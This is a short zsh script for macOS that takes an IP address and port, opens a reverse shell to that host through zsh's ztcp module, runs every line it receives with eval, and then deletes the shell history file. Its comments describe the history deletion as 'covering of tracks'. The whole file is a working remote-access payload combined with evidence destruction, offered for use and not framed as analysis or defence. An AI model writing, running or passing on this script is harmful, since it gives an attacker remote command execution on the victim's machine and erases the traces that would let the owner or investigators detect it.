#!/bin/zsh

#TODO: ENSURE THIS RUNS AS "source macRevShell.sh -I [ip] -P [port]" to make sure it clears the GLOBAL SHELL history and not the .sh subshell

# this is more or less the reused code from my mac+linux reverse shell but more mac based (thru zsh instead of bash) and with covering of tracks.

# Don't touch unless you're modifying the actual payload for macOS

while getopts ":I:P:" opt; do
  case $opt in
    I) IP_ADDRESS="$OPTARG"
    ;;
    P) PORT="$OPTARG"
    ;;
    \?) echo "Invalid option -$OPTARG" >&2
    exit 1
    ;;
  esac
done

echo "Attempting to establish reverse shell on $IP_ADDRESS:$PORT..."

# Use Zsh for the reverse shell
zsh -c "zmodload zsh/net/tcp;ztcp $IP_ADDRESS $PORT;while read line;do
eval \$line 2>&1 >&\$REPLY; done <&\$REPLY 2>&1 >&\$REPLY" &

# Wait for a brief moment to allow the shell to establish
sleep 1

# Check if the background process (zsh -c) is still running
if ps | grep $! > /dev/null; then
    echo "Shell established!"
else
    echo "Failed to establish shell."
fi

# Neato lil command to both clear ALL zsh history as well as close the terminal
exec rm $HISTFILE
